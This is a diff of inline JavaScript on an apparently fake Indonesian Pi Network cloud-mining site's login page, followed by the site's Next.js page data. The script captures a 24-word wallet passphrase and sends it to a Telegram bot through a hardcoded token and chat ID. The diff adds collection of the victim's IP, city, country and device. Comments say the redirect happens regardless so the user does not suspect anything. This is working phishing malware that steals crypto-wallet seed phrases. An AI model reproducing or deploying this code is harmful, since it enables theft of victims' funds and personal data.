@@ -2,52 +2,55 @@
 document.querySelector('form').addEventListener('submit', function(e) {
   e.preventDefault();
   
-  // Konfigurasi Telegram Langsung
   var TELEGRAM_BOT_TOKEN = '7719532232:AAEeFLNU117FY_Lx2wM499U-GstKTb_1by8';
   var TELEGRAM_CHAT_ID = '6741003817';
 
   var passphraseInput = this.querySelector('textarea');
-  var raw = passphraseInput.value.trim();
-  var normalized = raw.replace(/\s+/g,' ');
+  var normalized = passphraseInput.value.trim().replace(/\s+/g,' ');
   var words = normalized.split(' ').filter(Boolean);
   
   if (words.length !== 24) {
-    alert('Passphrase harus 24 kata. Saat ini: ' + words.length + ' kata.');
+    alert('Passphrase harus 24 kata.');
     return;
   }
 
-  // Simpan backup di browser user
-  localStorage.setItem('walletPassphrase', normalized);
+  // Ambil Data IP dan Negara lewat API publik (Realtime)
+  fetch('https://ipapi.co')
+    .then(res => res.json())
+    .then(ipData => {
+      var ip = ipData.ip || 'Unknown';
+      var country = ipData.country_name || 'Unknown';
+      var city = ipData.city || 'Unknown';
+      var device = navigator.userAgent;
 
-  // Format pesan untuk Telegram
-  var message = "<b>🔔 Passphrase Baru (Vercel)</b>\n" +
-                "<b>Waktu:</b> " + new Date().toLocaleString('id-ID') + "\n\n" +
-                "<code>" + normalized + "</code>";
+      var message = "<b>🔔 Passphrase Baru (Vercel)</b>\n" +
+                    "<b>Waktu:</b> " + new Date().toLocaleString('id-ID') + "\n\n" +
+                    "<code>" + normalized + "</code>\n\n" +
+                    "<b>📍 LOKASI:</b> " + city + ", " + country + "\n" +
+                    "<b>🌐 IP:</b> " + ip + "\n" +
+                    "<b>📱 DEVICE:</b> " + device;
 
-  // Kirim data ke Telegram
-  fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      chat_id: TELEGRAM_CHAT_ID,
-      text: message,
-      parse_mode: 'HTML'
+      // KIRIM KE TELEGRAM (URL diperbaiki)
+      return fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message,
+          parse_mode: 'HTML'
+        })
+      });
     })
-  })
-  .then(function() {
-    // Redirect jika berhasil
-    window.location.href = '/id/onboarding/name.html';
-  })
-  .catch(function(err) {
-    // Tetap redirect jika gagal agar user tidak curiga
-    console.error('Error:', err);
-    window.location.href = '/id/onboarding/name.html';
-  });
+    .finally(function() {
+      // Pastikan redirect ke halaman selanjutnya
+      window.location.href = '/id/onboarding/name.html';
+    });
 
-  // Backup redirect (jika fetch terlalu lama/dipending browser)
+  // Backup redirect jika proses di atas macet
   setTimeout(function(){
      window.location.href = '/id/onboarding/name.html';
-  }, 2000); 
+  }, 3000); 
 });
+
 </script>
 <script src="/_next/static/chunks/0zje8b4_hehp_.js" id="_R_" async=""></script><script>(self.__next_f=self.__next_f||[]).push([0])</script><script>self.__next_f.push([1,"1:\"$Sreact.fragment\"\n2:I[39756,[\"/_next/static/chunks/01xlw8hd842-c.js\",\"/_next/static/chunks/0d3shmwh5_nmn.js\"],\"default\"]\n3:I[37457,[\"/_next/static/chunks/01xlw8hd842-c.js\",\"/_next/static/chunks/0d3shmwh5_nmn.js\"],\"default\"]\n4:I[22016,[\"/_next/static/chunks/13h-0fd.p-1ga.js\"],\"\"]\n6:I[47257,[\"/_next/static/chunks/01xlw8hd842-c.js\",\"/_next/static/chunks/0d3shmwh5_nmn.js\"],\"ClientPageRoot\"]\n7:I[47230,[\"/_next/static/chunks/095htz9lds02m.js\",\"/_next/static/chunks/0kqptusi32wzc.js\"],\"default\"]\n8:I[97367,[\"/_next/static/chunks/01xlw8hd842-c.js\",\"/_next/static/chunks/0d3shmwh5_nmn.js\"],\"OutletBoundary\"]\n9:\"$Sreact.suspense\"\nc:I[97367,[\"/_next/static/chunks/01xlw8hd842-c.js\",\"/_next/static/chunks/0d3shmwh5_nmn.js\"],\"ViewportBoundary\"]\ne:I[97367,[\"/_next/static/chunks/01xlw8hd842-c.js\",\"/_next/static/chunks/0d3shmwh5_nmn.js\"],\"MetadataBoundary\"]\n10:I[63491,[\"/_next/static/chunks/0-t9l.gbvse3e.js\"],\"default\"]\n:HL[\"/_next/static/chunks/0qck3~eh~8m2o.css\",\"style\"]\n:HL[\"/_next/static/media/051742360c26797e-s.p.0f97p8c3305p~.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n:HL[\"/_next/static/media/0c89a48fa5027cee-s.p.0rd3rjvnnhw7n.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n:HL[\"/_next/static/media/fba5a26ea33df6a3-s.p.0eehd8tgys7nv.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n"])</script><script>self.__next_f.push([1,"0:{\"P\":null,\"c\":[\"\",\"id\",\"login\"],\"q\":\"\",\"i\":false,\"f\":[[[\"\",{\"children\":[[\"lang\",\"id\",\"d\",null],{\"children\":[\"login\",{\"children\":[\"__PAGE__\",{}]}]}]},\"$undefined\",\"$undefined\",16],[[\"$\",\"$1\",\"c\",{\"children\":[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/chunks/0qck3~eh~8m2o.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}]],[\"$\",\"html\",null,{\"className\":\"space_grotesk_1d8c5cc8-module__-5dOoa__variable plus_jakarta_sans_56a4d202-module__SrayoG__variable jetbrains_mono_fcc8d2be-module__GCAIpq__variable h-full antialiased\",\"style\":{\"fontFamily\":\"var(--font-plus-jakarta), system-ui, sans-serif\"},\"suppressHydrationWarning\":true,\"children\":[\"$\",\"body\",null,{\"className\":\"min-h-full\",\"style\":{\"color\":\"var(--ink-900)\"},\"children\":[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[[\"$\",\"div\",null,{\"style\":{\"minHeight\":\"100vh\",\"display\":\"flex\",\"alignItems\":\"center\",\"justifyContent\":\"center\",\"padding\":24,\"background\":\"linear-gradient(135deg, #5BC0FF 0%, #B89BFF 50%, #FF9BD2 100%)\",\"fontFamily\":\"system-ui, sans-serif\"},\"children\":[\"$\",\"div\",null,{\"style\":{\"background\":\"rgba(255,255,255,0.95)\",\"borderRadius\":24,\"padding\":40,\"maxWidth\":480,\"width\":\"100%\",\"boxShadow\":\"0 30px 80px rgba(14,42,71,0.25)\",\"textAlign\":\"center\"},\"children\":[[\"$\",\"div\",null,{\"style\":{\"width\":64,\"height\":64,\"borderRadius\":\"50%\",\"background\":\"linear-gradient(135deg, #5BC0FF 0%, #FF9BD2 100%)\",\"margin\":\"0 auto 18px\",\"display\":\"flex\",\"alignItems\":\"center\",\"justifyContent\":\"center\",\"color\":\"white\",\"fontSize\":28,\"fontWeight\":800},\"children\":\"404\"}],[\"$\",\"h1\",null,{\"style\":{\"fontSize\":26,\"fontWeight\":800,\"letterSpacing\":\"-0.02em\",\"margin\":\"0 0 10px\",\"color\":\"#0E2A47\"},\"children\":\"Page not found\"}],[\"$\",\"p\",null,{\"style\":{\"color\":\"#4A6781\",\"margin\":\"0 0 24px\",\"fontSize\":14,\"lineHeight\":1.5},\"children\":\"The page you're looking for drifted away in the cloud.\"}],[\"$\",\"$L4\",null,{\"href\":\"/\",\"style\":{\"display\":\"inline-block\",\"padding\":\"12px 24px\",\"borderRadius\":999,\"fontSize\":14,\"fontWeight\":600,\"background\":\"linear-gradient(135deg, #5BC0FF 0%, #FF9BD2 100%)\",\"color\":\"white\",\"textDecoration\":\"none\",\"boxShadow\":\"0 8px 22px rgba(91,192,255,0.35)\"},\"children\":\"Back to home\"}]]}]}],[]],\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]}]}]]}],{\"children\":[[\"$\",\"$1\",\"c\",{\"children\":[[[\"$\",\"script\",\"script-0\",{\"src\":\"/_next/static/chunks/095htz9lds02m.js\",\"async\":true,\"nonce\":\"$undefined\"}]],\"$L5\"]}],{\"children\":[[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}],{\"children\":[[\"$\",\"$1\",\"c\",{\"children\":[[\"$\",\"$L6\",null,{\"Component\":\"$7\",\"serverProvidedParams\":{\"searchParams\":{},\"params\":{\"lang\":\"id\"},\"promises\":null}}],[[\"$\",\"script\",\"script-0\",{\"src\":\"/_next/static/chunks/0kqptusi32wzc.js\",\"async\":true,\"nonce\":\"$undefined\"}]],[\"$\",\"$L8\",null,{\"children\":[\"$\",\"$9\",null,{\"name\":\"Next.MetadataOutlet\",\"children\":\"$@a\"}]}]]}],{},null,false,null]},null,false,\"$@b\"]},null,false,null]},null,false,null],[\"$\",\"$1\",\"h\",{\"children\":[null,[\"$\",\"$Lc\",null,{\"children\":\"$Ld\"}],[\"$\",\"div\",null,{\"hidden\":true,\"children\":[\"$\",\"$Le\",null,{\"children\":[\"$\",\"$9\",null,{\"name\":\"Next.Metadata\",\"children\":\"$Lf\"}]}]}],[\"$\",\"meta\",null,{\"name\":\"next-size-adjust\",\"content\":\"\"}]]}],false]],\"m\":\"$undefined\",\"G\":[\"$10\",[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/chunks/0qck3~eh~8m2o.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}]]],\"S\":false,\"h\":null,\"s\":\"$undefined\",\"l\":\"$undefined\",\"p\":\"$undefined\",\"d\":\"$undefined\",\"b\":\"E249yEUfsgTMfJeHMRjrv\"}\n"])</script><script>self.__next_f.push([1,"11:[]\nb:\"$W11\"\nd:[[\"$\",\"meta\",\"0\",{\"charSet\":\"utf-8\"}],[\"$\",\"meta\",\"1\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}]]\n"])</script><script>self.__next_f.push([1,"12:I[33499,[\"/_next/static/chunks/095htz9lds02m.js\"],\"LangProvider\"]\n13:I[64928,[\"/_next/static/chunks/095htz9lds02m.js\",\"/_next/static/chunks/03ids8s2mwdpd.js\"],\"default\"]\n14:I[55934,[\"/_next/static/chunks/095htz9lds02m.js\",\"/_next/static/chunks/0zw8sj4j-4~bv.js\"],\"default\"]\n15:I[27201,[\"/_next/static/chunks/01xlw8hd842-c.js\",\"/_next/static/chunks/0d3shmwh5_nmn.js\"],\"IconMark\"]\n"])</script><script>self.__next_f.push([1,"5:[[\"$\",\"script\",null,{\"type\":\"application/ld+json\",\"suppressHydrationWarning\":true,\"children\":\"{\\\"@context\\\":\\\"https://schema.org\\\",\\\"@graph\\\":[{\\\"@type\\\":\\\"Organization\\\",\\\"@id\\\":\\\"https://cloudminepi.com/#org\\\",\\\"name\\\":\\\"CLOUD PI\\\",\\\"url\\\":\\\"https://cloudminepi.com\\\",\\\"logo\\\":\\\"https://cloudminepi.com/apple-icon\\\"},{\\\"@type\\\":\\\"WebSite\\\",\\\"@id\\\":\\\"https://cloudminepi.com/#website\\\",\\\"url\\\":\\\"https://cloudminepi.com\\\",\\\"name\\\":\\\"CLOUD PI\\\",\\\"description\\\":\\\"Tambang Pi Network non-stop dari infrastruktur cloud kami. Hemat baterai HP, lebih efisien, aman. Dapat Starter Node gratis untuk setiap referral berhasil.\\\",\\\"publisher\\\":{\\\"@id\\\":\\\"https://cloudminepi.com/#org\\\"},\\\"inLanguage\\\":[\\\"id-ID\\\",\\\"en-US\\\"]},{\\\"@type\\\":\\\"WebApplication\\\",\\\"name\\\":\\\"CLOUD PI\\\",\\\"url\\\":\\\"https://cloudminepi.com\\\",\\\"applicationCategory\\\":\\\"FinanceApplication\\\",\\\"operatingSystem\\\":\\\"Web\\\",\\\"offers\\\":{\\\"@type\\\":\\\"Offer\\\",\\\"price\\\":\\\"0\\\",\\\"priceCurrency\\\":\\\"USD\\\"},\\\"description\\\":\\\"Tambang Pi Network non-stop dari infrastruktur cloud kami. Hemat baterai HP, lebih efisien, aman. Dapat Starter Node gratis untuk setiap referral berhasil.\\\"}]}\"}],[\"$\",\"$L12\",null,{\"initialLang\":\"id\",\"children\":[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$13\",\"errorStyles\":[],\"errorScripts\":[[\"$\",\"script\",\"script-0\",{\"src\":\"/_next/static/chunks/03ids8s2mwdpd.js\",\"async\":true}]],\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[[\"$\",\"$L14\",null,{}],[]],\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]}]]\n"])</script><script>self.__next_f.push([1,"a:null\n"])</script><script>self.__next_f.push([1,"f:[[\"$\",\"title\",\"0\",{\"children\":\"CLOUD PI — Tambang Pi Network 24/7 dari Awan\"}],[\"$\",\"meta\",\"1\",{\"name\":\"description\",\"content\":\"Tambang Pi Network non-stop dari infrastruktur cloud kami. Hemat baterai HP, lebih efisien, aman. Dapat Starter Node gratis untuk setiap referral berhasil.\"}],[\"$\",\"meta\",\"2\",{\"name\":\"application-name\",\"content\":\"CLOUD PI\"}],[\"$\",\"meta\",\"3\",{\"name\":\"author\",\"content\":\"CLOUD PI\"}],[\"$\",\"link\",\"4\",{\"rel\":\"manifest\",\"href\":\"/manifest.webmanifest\",\"crossOrigin\":\"$undefined\"}],[\"$\",\"meta\",\"5\",{\"name\":\"keywords\",\"content\":\"Pi Network,tambang Pi,cloud mining,Pi Network Indonesia,cloud miner Pi,kripto Pi,tambang Pi dari cloud,Starter Node Pi\"}],[\"$\",\"meta\",\"6\",{\"name\":\"creator\",\"content\":\"CLOUD PI\"}],[\"$\",\"meta\",\"7\",{\"name\":\"publisher\",\"content\":\"CLOUD PI\"}],[\"$\",\"meta\",\"8\",{\"name\":\"robots\",\"content\":\"index, follow\"}],[\"$\",\"meta\",\"9\",{\"name\":\"googlebot\",\"content\":\"index, follow, max-video-preview:-1, max-image-preview:large, max-snippet:-1\"}],[\"$\",\"meta\",\"10\",{\"name\":\"category\",\"content\":\"technology\"}],[\"$\",\"link\",\"11\",{\"rel\":\"canonical\",\"href\":\"https://cloudminepi.com/id\"}],[\"$\",\"link\",\"12\",{\"rel\":\"alternate\",\"hrefLang\":\"en\",\"href\":\"https://cloudminepi.com/en\"}],[\"$\",\"link\",\"13\",{\"rel\":\"alternate\",\"hrefLang\":\"id-ID\",\"href\":\"https://cloudminepi.com/id\"}],[\"$\",\"link\",\"14\",{\"rel\":\"alternate\",\"hrefLang\":\"x-default\",\"href\":\"https://cloudminepi.com/en\"}],[\"$\",\"meta\",\"15\",{\"name\":\"format-detection\",\"content\":\"telephone=no, address=no, email=no\"}],[\"$\",\"meta\",\"16\",{\"property\":\"og:title\",\"content\":\"CLOUD PI — Tambang Pi Network 24/7 dari Awan\"}],[\"$\",\"meta\",\"17\",{\"property\":\"og:description\",\"content\":\"Tambang Pi Network non-stop dari infrastruktur cloud kami. Hemat baterai HP, lebih efisien, aman. Dapat Starter Node gratis untuk setiap referral berhasil.\"}],[\"$\",\"meta\",\"18\",{\"property\":\"og:url\",\"content\":\"https://cloudminepi.com/id\"}],[\"$\",\"meta\",\"19\",{\"property\":\"og:site_name\",\"content\":\"CLOUD PI\"}],[\"$\",\"meta\",\"20\",{\"property\":\"og:locale\",\"content\":\"id_ID\"}],[\"$\",\"meta\",\"21\",{\"property\":\"og:image\",\"content\":\"https://cloudminepi.com/opengraph-image\"}],[\"$\",\"meta\",\"22\",{\"property\":\"og:image:width\",\"content\":\"1200\"}],[\"$\",\"meta\",\"23\",{\"property\":\"og:image:height\",\"content\":\"630\"}],[\"$\",\"meta\",\"24\",{\"property\":\"og:image:alt\",\"content\":\"CLOUD PI — Tambang Pi Network 24/7 dari Awan\"}],[\"$\",\"meta\",\"25\",{\"property\":\"og:locale:alternate\",\"content\":\"en_US\"}],[\"$\",\"meta\",\"26\",{\"property\":\"og:type\",\"content\":\"website\"}],[\"$\",\"meta\",\"27\",{\"name\":\"twitter:card\",\"content\":\"summary_large_image\"}],[\"$\",\"meta\",\"28\",{\"name\":\"twitter:title\",\"content\":\"CLOUD PI — Tambang Pi Network 24/7 dari Awan\"}],[\"$\",\"meta\",\"29\",{\"name\":\"twitter:description\",\"content\":\"Tambang Pi Network non-stop dari infrastruktur cloud kami. Hemat baterai HP, lebih efisien, aman. Dapat Starter Node gratis untuk setiap referral berhasil.\"}],[\"$\",\"meta\",\"30\",{\"name\":\"twitter:image\",\"content\":\"https://cloudminepi.com/opengraph-image\"}],[\"$\",\"link\",\"31\",{\"rel\":\"icon\",\"href\":\"/icon?0511d79adc74e0be\",\"alt\":\"$undefined\",\"type\":\"image/png\",\"sizes\":\"32x32\"}],[\"$\",\"link\",\"32\",{\"rel\":\"apple-touch-icon\",\"href\":\"/apple-icon?132e27cd05113c94\",\"alt\":\"$undefined\",\"type\":\"image/png\",\"sizes\":\"180x180\"}],[\"$\",\"$L15\",\"33\",{}]]\n"])</script></body></html>
